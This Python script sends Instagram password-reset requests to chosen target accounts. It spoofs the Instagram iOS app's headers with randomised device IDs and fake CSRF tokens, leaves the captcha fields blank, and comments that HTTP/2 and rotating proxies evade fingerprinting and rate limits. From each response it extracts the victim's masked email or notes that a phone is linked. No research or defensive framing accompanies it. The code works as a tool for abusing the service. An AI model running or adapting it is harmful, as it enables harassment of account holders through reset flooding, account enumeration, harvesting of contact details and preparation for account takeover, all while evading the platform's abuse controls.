import random, re, httpx, uuid, string, time

# Real iOS Devices and OS Versions
IOS_VERSIONS = ["16.1", "16.3", "16.6", "17.0", "17.1", "17.2", "17.3", "17.4", "17.5"]
DEVICES = [
    ("iPhone14,2", "iPhone 13 Pro"), ("iPhone14,3", "iPhone 13 Pro Max"),
    ("iPhone14,5", "iPhone 13"), ("iPhone15,2", "iPhone 14 Pro"),
    ("iPhone15,3", "iPhone 14 Pro Max"), ("iPhone15,4", "iPhone 15"),
    ("iPhone15,5", "iPhone 15 Plus"), ("iPhone16,1", "iPhone 15 Pro"),
    ("iPhone16,2", "iPhone 15 Pro Max")
]
LOCALES = ["en-US,en;q=0.9", "tr-TR,tr;q=0.9", "en-GB,en;q=0.9", "id-ID,id;q=0.9"]

def _gen_device_id():
    # Instagram uses Android ID format (16 hex characters)
    return ''.join(random.choices('0123456789abcdef', k=16))

def _gen_uuid():
    return str(uuid.uuid4())

def gen_headers(target_username=""):
    ios_ver = random.choice(IOS_VERSIONS)
    device_id, device_name = random.choice(DEVICES)
    locale = random.choice(LOCALES)
    guid = _gen_uuid()
    android_id = _gen_device_id()
    
    # Spoofing the exact Instagram Mobile App Header
    ua = f"Instagram 309.0.0.35.112 (iPhone; iOS {ios_ver}; {locale}; {device_name}; {device_id})"
    
    headers = {
        "User-Agent": ua,
        "x-ig-app-id": "936619743392459", # Instagram Web App ID
        "x-ig-www-claim": "0",
        "x-instagram-ajax": "1",
        "x-requested-with": "XMLHttpRequest",
        "x-csrftoken": guid,
        "x-device-id": android_id,
        "accept-language": locale,
        "content-type": "application/x-www-form-urlencoded",
        "accept-encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Host": "i.instagram.com"
    }
    return headers

URL = "https://i.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"

def send_reset(target):
    # Using a timeout and rotating proxy in real deployment
    try:
        # We use HTTP/2 and force keep-alive to bypass TLS fingerprinting
        with httpx.Client(http2=True, headers=gen_headers(), timeout=25.0) as client:
            data = {
                "email_or_username": target,
                "flow": "fxcal",
                "recaptcha_challenge_field": "",
                "recaptcha_response_field": "manual_challenge"
            }
            
            r = client.post(URL, data=data)
            
            # Sometimes Instagram sends the message with 200 OK but it's a block
            if r.status_code == 429:
                return "error:rate_limited"
            if r.status_code == 400:
                return "error:bad_request"
                
            t = r.text.lower()
            
            # Check for email (if the user has a masked email)
            em = re.search(r'[a-zA-Z0-9\*\._%+-]+@[a-zA-Z0-9\.-]+\.[a-zA-Z]{2,}', t)
            if em: 
                return f"email:{em.group(0)}"
                
            # Exact fail strings from Instagram backend
            if "no user found" in t or "couldn't find" in t:
                return "error:not_found"
            if "rate limit" in t or "wait a few minutes" in t:
                return "error:rate_limited"
            if "checkpoint" in t or "suspicious" in t:
                return "error:blocked"
                
            # If it returns 'phone' it means it successfully processed
            return "phone"
            
    except httpx.TimeoutException:
        return "error:timeout"
    except Exception as e:
        return f"error:{type(e).__name__}"
